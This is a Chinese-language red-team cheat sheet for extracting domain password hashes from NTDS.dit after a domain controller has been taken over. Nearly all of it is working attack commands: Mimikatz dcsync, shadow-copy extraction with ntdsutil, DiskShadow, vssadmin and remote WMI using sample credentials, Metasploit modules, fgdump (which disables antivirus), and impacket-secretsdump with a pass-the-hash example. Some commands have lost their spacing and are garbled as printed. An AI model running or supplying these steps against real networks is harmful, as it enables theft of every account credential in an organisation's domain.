在获得域控制权限之后，需要将域中用户的hash 导出来，以便后续的渗透，通常user和hash存储在：

C:\Windows\NTDS\NTDS.dit

本文算是一个导出域 hash 的备忘录，记录导出的不同方式，不会涉及原理。

Mimikatz     

Mimikatz具有一项功能（dcsync），该功能利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希。这种技术不会向向域控制器进行身份验证，因为它可以从域管理员的上下文中作为域一部分的任何系统中执行。因此，这是红色团队的标准技术，因为它产生的动静比较小。

lsadump::dcsync /domain:pentestlab.local /all /csv


通过使用/ user参数指定域用户名，Mimikatz可以转储该特定用户的所有帐户信息，包括其密码哈希。

lsadump::dcsync /domain:pentestlab.local /user:test

或者，可以通过lsass.exe进程转储直接在域控制器密码哈希中执行Mimikatz。

privilege::debuglsadump::lsa /inject

Nishang

Nishang是一个PowerShell框架，它可以让红队和渗透测试人员可以对系统执行攻击性操作。该项目的VSS脚本可以用于自动提取所需的文件：NTDS.DIT，SAM和SYSTEM。并将这些文件解压到当前工作目录或任何其他指定的文件夹中。

Import-Module .\Copy-VSS.ps1Copy-VSSCopy-VSS -DestinationDir C:\ShadowCopy\

 

使用meterpreter的powershell扩展并执行命令

load powershellpowershell_import /root/Copy-VSS.ps1 powershell_execute Copy-VSS

也可以使用powershell_shell命令直接上传文件执行

Copy-VSSCopy-VSS -DestinationDir C:\Ninja

ntdsuti

该NTDSUTIL是一个命令行工具，它是域控制器生态系统的一部分，其目的是为了使管理员能够访问和管理WindowsActive Directory数据库。但是，渗透测试人员和红色团队可能会滥用该工具来获取现有ntds.dit文件的快照，该快照可以复制到新位置以进行脱机分析和提取密码哈希。

ntdsutilactivate instance ntdsifmcreate full C:\ntdsutilquitquit

DiskShadow

DiskShadow是Microsoft签名的二进制文件，用于帮助管理员进行与卷影复制服务（VSS）相关的操作。最初，bohops在他的博客中撰写了有关此二进制文件的文章。该二进制文件具有交互和脚本两种模式，因此可以使用一个脚本文件，其中将包含所有必需的命令，以自动执行NTDS.DIT提取过程。脚本文件可以包含以下几行，以便创建新的卷影副本，安装新驱动器，执行复制命令并删除卷影副本。

set context persistent nowriters add volume c: alias someAlias create expose %someAlias% z:exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit delete shadows volume %someAlias% reset

应当注意，DiskShadow二进制文件需要从C：\Windows \ System32路径执行。如果从另一个路径调用该脚本，则脚本将无法正确执行。

diskshadow.exe /s c:\diskshadow.txt

直接从解释器运行以下命令将列出系统的所有可用卷影副本:

diskshadowLIST SHADOWS ALL

SYSTEM 中包含了解密 NTDS 文件的加密 key：

reg.exe save hklm\system c:\exfil\system.bak

WMI

肖恩·梅特卡夫（SeanMetcalf）在他的博客中演示了可以通过WMI远程提取NTDS.DIT和SYSTEM文件。此技术使用vssadmin二进制文件创建卷影副本。

wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c vssadmin create shadow /for=C: 2>&1"


从远程将 shadow copy 中的 ntds.dit 拷贝出来：

wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \? \GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2>&1"

使用相同的方法将 SYSTEM 文件拷贝出来：

wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \? \GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp\SYSTEM.hive 2>&1"

将远程的文件拷贝到本地：

PS C:\Users\test.PENTESTLAB> copy \10.0.0.1\c$\temp\ntds.dit C:\tempPS C:\Users\test.PENTESTLAB> copy \10.0.0.1\c$\temp\SYSTEM.hive C:\temp

vssadmin 

卷影副本是Windows命令行实用程序，管理员可以使用它来备份计算机，卷和文件，即使操作系统正在使用它们。卷影复制作为服务运行，并且要求文件系统被格式化为NTFS，默认情况下，所有现代操作系统都是该文件系统。在Windows命令提示符下，执行以下操作将创建C：驱动器的快照，以按顺序将用户通常无法访问的文件复制到其他位置（本地文件夹，网络文件夹或可移动介质）。

vssadmin create shadow /for=C:

由于C：驱动器中的所有文件都已复制到另一个位置（HarddiskVolumeShadowCopy1），因此它们不会被操作系统直接使用，因此可以被访问并复制到另一个位置。该命令的副本，并将副本NTDS.DIT和SYSTEM文件到新创建的文件夹命名为影拷贝本地驱动器上。

copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy

这些文件需要从域控制器复制到另一个主机中以进行进一步处理。

vssown

类似于vssadmin实用程序Tim Tomes开发的vssown，这是一个可视化的基本脚本，可以创建和删除卷影副本，从已卸载的卷影副本运行任意可执行文件，并启动和停止卷影副本服务。

cscript vssown.vbs /startcscript vssown.vbs /create c cscript vssown.vbs /list cscript vssown.vbs /delete

 

复制需要的关键文件：

copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy11\windows\ntds\ntds.dit C:\vssown copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy11\windows\system32\config\SYSTEM C:\vssown copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy11\windows\system32\config\SAM C:\vssown

Metasploit                                                                                                        

Metasploit框架具有一个模块，该模块可通过服务器消息块（SMB）服务直接与域控制器进行身份验证，创建系统驱动器的卷影副本，并将NTDS.DIT和SYSTEM配置单元的副本下载到Metasploit目录中。这些文件可以与其他工具（例如impacket）一起使用，这些工具可以执行Active Directory密码哈希的提取。

use auxiliary/admin/smb/psexec_ntdsgrab

还有一个后期开发模块，可以将其链接到现有的Meterpreter会话中，以便通过ntdsutil方法检索域哈希。

use windows/gather/credentials/domain_hashdump

或者，如果存在到域控制器的现有Meterpreter会话，则可以使用命令hashdump。但是，这个方法不安全，可能会使域控制器崩溃。

hashdump

fgdump                                                                                                            

fgdump是一个古老的可执行文件，可提取的LanMan和NTLM密码哈希值。如果已获取本地管理员凭据，则可以在本地或远程执行它。在执行过程中，fgdump将尝试禁用可能在系统上运行的防病毒软件，如果成功，则将所有数据写入两个文件中。如果有防病毒或终端解决方案，则不应将fgdump用作转储密码哈希值的一种方法，以避免被检测到，因为大多数防病毒公司（包括Microsoft的WindowsDefender）都已将其标记出来。

直接运行即可：

fgdump.exe

可以通过查看.pwdump文件的内容来检索密码哈希。

type 127.0.0.1.pwdump

NTDS Extraction

Impacket是python脚本的集合，可用于执行各种任务，包括提取NTDS文件的内容。该impacket-secretsdump模块需要系统和NTDS数据库文件。

impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit LOCAL

此外，Impack可以使用计算机帐户及其哈希进行身份验证，从NTDS.DIT文件远程转储域密码哈希。

impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc$@10.0.0.1

作为代替Impack的解决方案，NTDSDumpEx也可以从Windows主机中提取域密码哈希。

NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive
